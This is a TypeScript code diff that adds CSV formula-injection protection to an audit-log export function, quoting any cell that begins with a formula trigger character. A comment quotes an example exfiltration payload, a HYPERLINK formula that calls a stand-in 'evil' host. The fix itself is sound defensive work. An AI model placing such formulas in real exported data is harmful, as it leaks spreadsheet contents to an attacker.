@@ -25,13 +25,25 @@ const COLUMNS = [
 	'actor_user_agent'
 ] as const;
 
-// RFC 4180-ish CSV field escape.
+// RFC 4180-ish CSV field escape, with CSV-formula-injection sanitisation.
+// Any cell whose first character is =, +, -, @, TAB, or CR is prefixed with
+// a leading single quote so Excel/Sheets treats it as text rather than as a
+// formula (OWASP recommended mitigation). Without this, an audit row with a
+// hand-crafted reason like `=HYPERLINK("http://evil/?"&A1)` would exfiltrate
+// data when the CSV is opened in a spreadsheet.
 function escapeField(value: unknown): string {
 	if (value === null || value === undefined) return '';
 	let s: string;
 	if (typeof value === 'string') s = value;
 	else if (typeof value === 'object') s = JSON.stringify(value);
 	else s = String(value);
+
+	if (s.length > 0) {
+		const first = s.charCodeAt(0);
+		if (first === 0x3d || first === 0x2b || first === 0x2d || first === 0x40 || first === 0x09 || first === 0x0d) {
+			s = "'" + s;
+		}
+	}
 
 	const needsQuoting = /[",\r\n]/.test(s);
 	if (!needsQuoting) return s;
